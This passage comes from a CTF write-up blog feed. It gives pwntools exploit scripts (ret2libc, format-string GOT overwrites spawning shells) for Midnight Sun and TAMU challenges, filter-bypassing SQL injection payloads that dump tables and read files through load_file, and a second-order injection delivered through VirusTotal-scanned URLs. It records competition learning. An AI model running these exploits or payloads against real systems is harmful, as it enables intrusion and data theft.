&lt;p&gt;&lt;img src=&#34;https://imgur.com/xOhQh4y.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;I want to thank the organizers for this cool CTF and nice tasks, unfortunately i didn&amp;rsquo;t have enough time to look at pwn tasks :( I really have to sleep now so if you have any questions contact me on Twitter @BelkahlaAhmed1&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Midnight Sun CTF Quals 2020 - Pwn Writeups</title>
      <link>https://ahmed-belkahla.me/post/midnight-sun-ctfquals/</link>
      <pubDate>Sat, 04 Apr 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/midnight-sun-ctfquals/</guid>
      <description>&lt;h1 id=&#34;pwn170pts-&#34;&gt;&lt;strong&gt;pwn1(70pts)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/4fbyzFx.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;It was a ret2libc task , but we had firstly to leak the libc base address using BOF (i leaked it through printf address) than we will return to main and perform our ret2 System :D
here is my exploit, if you have any questions you can contact me on twitter @BelkahlaAhmed1&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
from pwn import *
p=remote(&amp;quot;pwn1-01.play.midnightsunctf.se&amp;quot;,10001)
#p=process(&amp;quot;./pwn1&amp;quot;)
OFFSET=cyclic(72)
POP_RDI_RET=p64(0x0000000000400783)
PUTS=p64(0x0000000000400550)
LEAK=p64(0x602020)
MAIN=p64(0x400698)
payload=OFFSET+POP_RDI_RET+LEAK+PUTS+MAIN
log.info(&amp;quot;Payload Crafted&amp;quot;)
p.recvuntil(&amp;quot;buffer:&amp;quot;)
log.info(&amp;quot;Sending payload&amp;quot;)
#raw_input(&amp;quot;attach&amp;quot;)
p.sendline(payload) 
data=p.recvline().strip()
leak=u64(data.ljust(8,&amp;quot;\x00&amp;quot;))
BASE_LIBC=leak-0x64e80       # local 0x54a20 
log.info(&amp;quot;leaked libc base: &amp;quot;+hex(BASE_LIBC))
p.recvuntil(&amp;quot;buffer:&amp;quot;)
#BINSH=p64(BASELIBC+0x183cee)
#SYSTEM=p64(BASELIBC+0x46ed0)
RET=p64(0x0000000000400536)  
SYSTEM=p64(BASE_LIBC+0x4f440)
BINSH=p64(BASE_LIBC+0x1b3e9a)
payload=OFFSET+RET+POP_RDI_RET+BINSH+SYSTEM
p.sendline(payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Check Task files ** 
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/tree/master/Midnight%20Sun%20CTF%202020%20Quals/pwn1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt; **&lt;/p&gt;
&lt;h1 id=&#34;pwn280pts-&#34;&gt;&lt;strong&gt;pwn2(80pts)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/lYjuGsS.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;It was a really fun task , we had a format string vulnerability , so firstly i overwrited the GOT entry of the exit function with main address so we have now an infinite loop and the program will never exit , than using format string we leak the libc base address and than we overwrite the GOT entry of printf with the address of system :D
Here is my exploit , if you have any questions you can contact me o twitter @BelkahlaAhmed1&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
from pwn import *
def extract(add,n):
        p1=&amp;quot;0x&amp;quot;+add[-4:]
        p2=add[:6]
        if n==1:
                return p1
        if n==2:
                return p2
def pad(payload):
        return payload+&amp;quot;X&amp;quot;*(63-len(payload))
#p=process(&amp;quot;./pwn2&amp;quot;)
p=remote(&amp;quot;pwn2-01.play.midnightsunctf.se&amp;quot;,10002)
p.recvuntil(&amp;quot;input:&amp;quot;)
EXITGOT=p32(0x804b020)
EXITGOT2=p32(0x804b020+2)
&#39;&#39;&#39;
s=&amp;quot;&amp;quot;
for i in range(27,34):
        s+=&amp;quot;%&amp;quot;+str(i)+&amp;quot;$p &amp;quot;
&#39;&#39;&#39;
payload=EXITGOT+EXITGOT2
payload+=&amp;quot;%2044x%8$hn%32231x%7$hn&amp;quot;
#raw_input(&amp;quot;attach&amp;quot;)
p.sendline(pad(payload))
p.recvuntil(&amp;quot;input:&amp;quot;)
p.sendline(pad(&amp;quot;%30$x&amp;quot;))
data=p.recvuntil(&amp;quot;X&amp;quot;)
printf=int(&amp;quot;0x&amp;quot;+data[-9:-1],16)-5
LIBCBASE=printf-0x50b60
log.info(&amp;quot;Leaked Libc Base : &amp;quot;+hex(LIBCBASE))
p.recvuntil(&amp;quot;input:&amp;quot;)
PRINTFGOT=p32(0x804b00c)
PRINTFGOT2=p32(0x804b00c+2)
SYSTEM=LIBCBASE+0x3cd10
log.info(&amp;quot;System address: &amp;quot;+hex(SYSTEM))
payload=PRINTFGOT
payload+=PRINTFGOT2
p1=int(extract(hex(SYSTEM),1),16)
p2=int(extract(hex(SYSTEM),2),16)
log.info(&amp;quot;P1: &amp;quot;+str(p1-8)+&amp;quot; P2: &amp;quot;+str(p2-p1))
payload+=&amp;quot;%&amp;quot;+str(p1-8)+&amp;quot;x%7$hn%&amp;quot;+str(p2-p1)+&amp;quot;x%8$hn&amp;quot;
log.info(&amp;quot;Payload crafted&amp;quot;)
p.sendline(pad(payload))
p.recvuntil(&amp;quot;input:&amp;quot;)
p.sendline(&amp;quot;/bin/sh&amp;quot;)
p.interactive()

#Main address 0x80485eb
# 7 stack adress

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Task files &lt;strong&gt;
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/tree/master/Midnight%20Sun%20CTF%202020%20Quals/pwn2&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;These tasks were really fun, i&amp;rsquo;m sorry for the lack of details because i&amp;rsquo;m really busy this period :(&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>TAMU CTF 2020 - Pwn Writeups</title>
      <link>https://ahmed-belkahla.me/post/tamuctfpwn/</link>
      <pubDate>Mon, 30 Mar 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/tamuctfpwn/</guid>
      <description>&lt;h2 id=&#34;b64decoder-244pts-&#34;&gt;&lt;strong&gt;B64DECODER (244pts)&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/ZVHG4PA.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;This is wont be a detailed writeup , however in this task we have a clear format string vulnerability (line 23) and a leak of a64l function address&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/EIv7uYX.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;The idea is to overwrite the GOT entry of a64l function with the address of system in libc (not system@plt) using the format string vulnerability , it&amp;rsquo;s also a partial overwrite because we have a limited length of input (32 characters) and using the leaked address of a64l we can easily know the address of system function , here is my exploit :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import struct
import sys
def pad(str):
        return str+&amp;quot;X&amp;quot;*(32-len(str))
payload=&amp;quot;&amp;quot;
#p=process(&amp;quot;./b64decoder&amp;quot;)
p=remote(&amp;quot;challenges.tamuctf.com&amp;quot;,2783)
d=p.recvuntil(&amp;quot;name!&amp;quot;)
A64Ladd=d[:-18][-10:]
TOWRITE=&amp;quot;0x&amp;quot;+A64Ladd[-4:]
sys=int(TOWRITE,16)-1680-4  #A64l-0x690
log.info(TOWRITE)
log.info(sys)
A64L_PLT=0x804b398
a64lADD=p32(A64L_PLT)
payload+=a64lADD
payload+=&amp;quot;%&amp;quot;+str(sys)+&amp;quot;x%71$hn&amp;quot;
log.info(&amp;quot;payload crafted&amp;quot;)
p.sendline(payload)
log.info(&amp;quot;Sent , Haaaw el shell&amp;quot;)
p.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And Bingo we got our shell :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/jd78uIm.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Task files &lt;strong&gt;
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/tree/master/TAMU%20CTF/B64DECODER&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;troll-50pts-&#34;&gt;&lt;strong&gt;TROLL (50pts)&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/AgJ7rGR.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;In this task we are supposed to win a game by guessing the next 100 random numbers , looking at the source code we can see the vulnerable gets function , after that we are setting the seed
value to the time and finally the beginning of the loop and generating the random numbers and questions each time .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/AApFQgK.png&#34; alt=&#34;MAIN&#34;&gt;&lt;/p&gt;
&lt;p&gt;My idea was to overwrite the seed value with our own value than BINGO we can generate the next random numbers and win the game , i have done things manually , i entered a unique seaquence and than observed with gdb if i have overwritten where the seed value is stored&lt;/p&gt;
&lt;p&gt;My input :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/XqjEzZQ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;I have entered a sequence of alphabet characters and stopped in the call of srand function , you can see te RDI register(where the 1st argument passed to a function is stored)  hold the value of &amp;ldquo;MMMM&amp;rdquo;
so if we replace &amp;ldquo;MMMM&amp;rdquo; with the value we want , this value will be the seed for the random numbers.&lt;/p&gt;
&lt;p&gt;I have written this little C program to generate 100 random numbers using our chosen seed and stored them in a file :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;stdlib.h&amp;gt;
#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;time.h&amp;gt;

int main(int argc, char *argv[]){
    int i=0;
int seed=3472328296227680305    //0x1000 in decimal
srand(seed);
for(i=0;i&amp;lt;=99;i++){
    int a=rand()% 100000 + 1;
    printf(&amp;quot;%d\n&amp;quot;,a);  
} 
 return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After that i have written this exploit to overwrite the seed value with 0x1000 and answer the questions using the numbers we have generated&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
#p=process(&amp;quot;./troll&amp;quot;)
p=remote(&amp;quot;challenges.tamuctf.com&amp;quot;,4765)
p.recvuntil(&amp;quot;Who goes there?&amp;quot;)
SEED=&amp;quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP1000&amp;quot;
p.sendline(SEED)
log.info(&amp;quot;Sent First payload&amp;quot;)
answers=open(&amp;quot;answer&amp;quot;,&amp;quot;r&amp;quot;)
for line in answers:
        p.recvuntil(&amp;quot;What is it?&amp;quot;)
        log.info(&amp;quot;sending answer: &amp;quot;+line)
        p.sendline(line)
p.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Note: the offset in the remote server is different, so i had to guess it xD However we got our flag :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/QjwTHDR.png&#34; alt=&#34;MAIN&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Task files &lt;strong&gt;
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/tree/master/TAMU%20CTF/TROLL&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is the first time writing a pwn writeup so i hope you enjoyed it , any questions you can find me on twitter @BelkahlaAhmed1&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>The After Prequal - Securinets Quals 2k20</title>
      <link>https://ahmed-belkahla.me/post/the-after-prequalsecurinetsquals/</link>
      <pubDate>Mon, 23 Mar 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/the-after-prequalsecurinetsquals/</guid>
      <description>&lt;h1 id=&#34;the-after-prequal-971pts-19-solves-&#34;&gt;&lt;strong&gt;The after-Prequal (971pts) (19 Solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/pXLjH4n.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;This task was so fun and i learned new things from it , we are given a website with a search functionality and after testing a single quote injection we had an SQL error , so let&amp;rsquo;s start the exploitation of the famous SQL injection :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/B2IbSxr.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;After the basic enumeration we can notice that these characters are filtered : &lt;strong&gt;[&amp;rdquo; &amp;ldquo;,&amp;quot;-&amp;quot;,&amp;quot;,&amp;quot;]&lt;/strong&gt; so we will use the following bypasses:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The white space : &lt;strong&gt;%0A&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;The &amp;ldquo;-&amp;rdquo; : we will use &lt;strong&gt;#&lt;/strong&gt; to comment&lt;/li&gt;
&lt;li&gt;The &amp;ldquo;,&amp;rdquo; : we will use join to bypass it&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This step took me some time , after some tries i succeeded in equilibrating the query :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A2)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/5VSI80e.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And BINGO ! we succeeded to inject , all we have to do know is to dump the database as usual&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Tables:&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Atable_name%0AfRoM%0Ainformation_schema.tables)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Table name&lt;/strong&gt;: secrets&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/m190lNI.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Columns:&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Acolumn_name%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name=&amp;quot;secrets&amp;rdquo;)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The interesting &lt;strong&gt;Column name&lt;/strong&gt; : value&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/TegJtmS.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And finally :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Avalue%0Afrom%0Asecrets)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/8ycD4ru.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Damn no flag for us :&#39;( but no problem maybe if we just do load_file(&amp;ldquo;flag.txt&amp;rdquo;) we will have the flag ? unfortunately it wont work, in fact it&amp;rsquo;s not that easy and this is the most juicy part of the task xd
i checked the privileges of the current user and the FILE permission was not grantable ! wtf , this result was unpredictable for me so i started digging in mysql file permissions docs until i found this :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/TgUXftd.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;To limit the location in which files can be read and written, set the &lt;strong&gt;secure_file_priv&lt;/strong&gt; system variable to a specific directory. See Section 5.1.8, âServer System Variablesâ.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So probably the author have set a custom location in the global variable &lt;strong&gt;secure_file_priv&lt;/strong&gt; , let&amp;rsquo;s check its value in @@GLOBAL.secure_file_priv&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A@@GLOBAL.secure_file_priv)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/Pdn180B.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;BINGOOO ! so let&amp;rsquo;s have our flag now :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Aload_file(&amp;quot;/var/lib/mysql-files/flag/flag.txt&amp;rdquo;))b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;FLAG&lt;/strong&gt; : Securinets{SecuR3_YourSQL!} , I have enjoyed this task and learned a lot about mysql privileges from it , thank you @bibiwars or should i call you @nox xD If you enjoyed the writeup share it with your friends and don&amp;rsquo;t hesitate to ask me on twitter @BelkahlaAhmed1 :D&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Empire Total - Securinets Quals 20</title>
      <link>https://ahmed-belkahla.me/post/empire-total-securinetsquals20/</link>
      <pubDate>Sat, 21 Mar 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/empire-total-securinetsquals20/</guid>
      <description>&lt;h1 id=&#34;empire-total-1000pts-7-solves-&#34;&gt;&lt;strong&gt;Empire Total (1000pts) (7 Solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/rGcoI7o.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;This task was really so creative and i had so fun solving it , but i can&amp;rsquo;t deny that it was painful :( after reading the description we can say that we aim to dump the database of the website (maybe SQL injection who knows) and fortunately we have the source code so let&amp;rsquo;s download it and begin our trip xD&lt;/p&gt;
&lt;p&gt;After Visiting the website we find a tool based on Virus Total API , understanding the functionality of the website is really necessary for solving the task, we will cover it in details later, but as a first thought we give an ip address to the website and it will shows Virus Total stats about it&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/k7ScCjX.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/bjRXPJT.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;After cloning the project here is its structure&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;git clone &lt;a href=&#34;https://github.com/mohamedaymenkarmous/virustotal-api-html&#34;&gt;https://github.com/mohamedaymenkarmous/virustotal-api-html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/alxzV41.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;let&amp;rsquo;s take a look at index.php , since the code is really too long i will only put the important parts, as we can see after some configurations and Recaptcha setting, all the SQL queries are prepared statements so there is no way to perform SQL injection but we can notice the execution of the
&lt;strong&gt;shell_exec&lt;/strong&gt; function :D Interesting hmmm&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/A1kiMAa.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;shell_exec&lt;/strong&gt; is executing some python script with a scanned ip argument ,maybe manipulating it will give us something useful&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$command = &amp;quot;../VirusTotal.py &#39;$scanned_ip&#39;&amp;quot;;
$output = shell_exec($command);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;But unfortunately there&amp;rsquo;s too much restriction on our input :( it&amp;rsquo;s impossible to bypass the filter_var here and the JS restrictions (if you can bpass it just tell me xD )&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt; if(isset($_POST) &amp;amp;&amp;amp; !empty($_POST)){
  $scanned_ip=isset($_POST[&#39;ip&#39;]) &amp;amp;&amp;amp; !empty($_POST[&#39;ip&#39;])  &amp;amp;&amp;amp; !is_array($_POST[&#39;ip&#39;]) ? $_POST[&#39;ip&#39;] : &amp;quot;&amp;quot;;
  if(!$scanned_ip){header(&amp;quot;Location: /?invalid_ip&amp;quot;);exit();}
  if (filter_var($scanned_ip, FILTER_VALIDATE_IP)) {
  } else {header(&amp;quot;Location: /?invalid_ip&amp;quot;);exit();}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s proceed , it seems that the index.php is pretty safe ,let&amp;rsquo;s take a look at the VirusTotal.py script&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/ytcYYQQ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;OMG :&#39;( 499 lines , that was so discouraging @Emperors :( but we needed that flag to have the 10th place xD anyway after scrolling around and reading the code , we can somehow understand the behaviour of the website,
when we enter the ip address it asks the Virus Total API for the results and then there&amp;rsquo;s the persistence functionality that saves the results in the database and then when we enter the same ip address again it will loads
the results from the database .&lt;/p&gt;
&lt;p&gt;So if we can control the results maybe we will have the opportunity to perform an SQL injection ? I got stuck in this part for a long time and after the help of the admin ( Thank you @Emperors &amp;lt;3 ) i found something interesting :D&lt;/p&gt;
&lt;p&gt;before we proceed here&amp;rsquo;s a vulnerable function to SQL injection that saves the results of urls section in the database (line 417 in VirusTotal.py)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;  def persistURLs(self,selected_ips,ip_report_filtered):
    attr=&amp;quot;detected_urls&amp;quot;
    table_name=&amp;quot;vt_scanned_urls_table&amp;quot;
    newAttr=self.AttrSubstitution[attr] if attr in self.AttrSubstitution else attr
    selected_urls=self.findPersistedIP(selected_ips[0][&#39;id&#39;],table_name)
    selected_urls_filtered=[]
    for selected_url in selected_urls:
      selected_urls_filtered.append(selected_url[&#39;url&#39;])
    if newAttr in ip_report_filtered:
     for url in ip_report_filtered[newAttr]:
      print(url[&#39;URL&#39;])
      if url[&#39;URL&#39;] not in selected_urls_filtered:
        try:
          self.CursorRW.execute(&amp;quot;INSERT INTO &amp;quot;+table_name+&amp;quot; (ip_id,url,detections,scanned_time) VALUES (&#39;&amp;quot;+str(selected_ips[0][&#39;id&#39;])+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;URL&#39;]+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;Detections&#39;]+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;Scanned&#39;]+&amp;quot;&#39;)&amp;quot;)
          self.DBRW.commit()
          self.resetSQL()
        except Exception as e:
          print(&amp;quot;INSERT INTO &amp;quot;+table_name+&amp;quot; (ip_id,url,detections,scanned_time) VALUES (&#39;&amp;quot;+str(selected_ips[0][&#39;id&#39;])+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;URL&#39;]+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;Detections&#39;]+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;Scanned&#39;]+&amp;quot;&#39;)&amp;quot;)
          print(&amp;quot;EXCEPTION: &amp;quot;,e)
          self.resetSQL()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;exploitation-&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;So the idea is that if we go to VirusTotal website (&lt;a href=&#34;https://www.virustotal.com/&#34;&gt;https://www.virustotal.com/&lt;/a&gt;) and scan a url ,and then go back to our challenge website and scan the url&amp;rsquo;s ip
we will find that the url we scanned in VirusTotal website will appear , it&amp;rsquo;s pretty confusing i know so let&amp;rsquo;s have an example&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;We go to Virus Total website and scan for any url for example :( in my case i launched a web server on my VPS and used it here )&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;http://100.26.206.184/?u=Just testing for the writeup :p&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/mGOQ1tQ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Now we go back to the challenge website and scan the ip address&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/N7ymSRT.jpg&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Yeeees ! it&amp;rsquo;s appearing in the results so we now have the control over these values in the urls section of the results.&lt;/p&gt;
&lt;p&gt;Now here is our scenario , if we look to the vulnerable function &lt;strong&gt;persistURLs&lt;/strong&gt; in VirusTotal.py we can notice the injection in this query (line 430)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;INSERT INTO &amp;ldquo;+table_name+&amp;rdquo; (ip_id,url,detections,scanned_time) VALUES (&#39;&amp;ldquo;+str(selected_ips[0][&amp;lsquo;id&amp;rsquo;])+&amp;rdquo;&#39;,&#39;&amp;ldquo;+url[&amp;lsquo;URL&amp;rsquo;]+&amp;rdquo;&#39;,&#39;&amp;ldquo;+url[&amp;lsquo;Detections&amp;rsquo;]+&amp;rdquo;&#39;,&#39;&amp;ldquo;+url[&amp;lsquo;Scanned&amp;rsquo;]+&amp;rdquo;&#39;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We have control over the &lt;strong&gt;url[&amp;lsquo;URL&amp;rsquo;]&lt;/strong&gt; parameter (the url we scan in VirusTotal Website) so it&amp;rsquo;s now an SQL injection in INSERT INTO values, but we have some constraints :&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The url encoding &lt;strong&gt;%20&lt;/strong&gt; that will be interpreted with the SQL query so we have to find another way in our payload instead of white spaces which is a well known bypass:  &lt;strong&gt;/**/&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;The second thing faced me when i was solving the challenge , we can&amp;rsquo;t use &lt;strong&gt;&amp;ndash; -&lt;/strong&gt; to equilibrate the SQL query so we will have to find a solution to equilibrate it&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In order to test the injection locally i have created this small script that connects to my local DB and executes the same query, you can find it &lt;strong&gt;
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/Securinets%20Prequals%202k20/Empire%20Total/test.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Finally I opted to this solution, here is the URL we will scan :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/**/1),(select/**/2)),(&amp;lsquo;102&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The complete SQL query that will be executed is  :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;INSERT INTO detected_urls (ip_id,url,detections,scanned_time) VALUES (&amp;lsquo;2&amp;rsquo;,&amp;lsquo;100.26.206.184/?u=&amp;rsquo;,(select 1),(select 2)),(&amp;lsquo;102&amp;rsquo;,&amp;lsquo;a&amp;rsquo;,&amp;lsquo;15&amp;rsquo;,&amp;lsquo;yes&amp;rsquo;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s try it now , we first scan it in VirusTotal :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/3L7lmrs.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And now let&amp;rsquo;s scan the IP in the challenge website  :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/f2CRd7H.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s fetched successfully, let&amp;rsquo;s scan the ip another time now to check if our injection succeeded or not, we must see 1,2 in the output :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/U3SEcaV.jpg&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
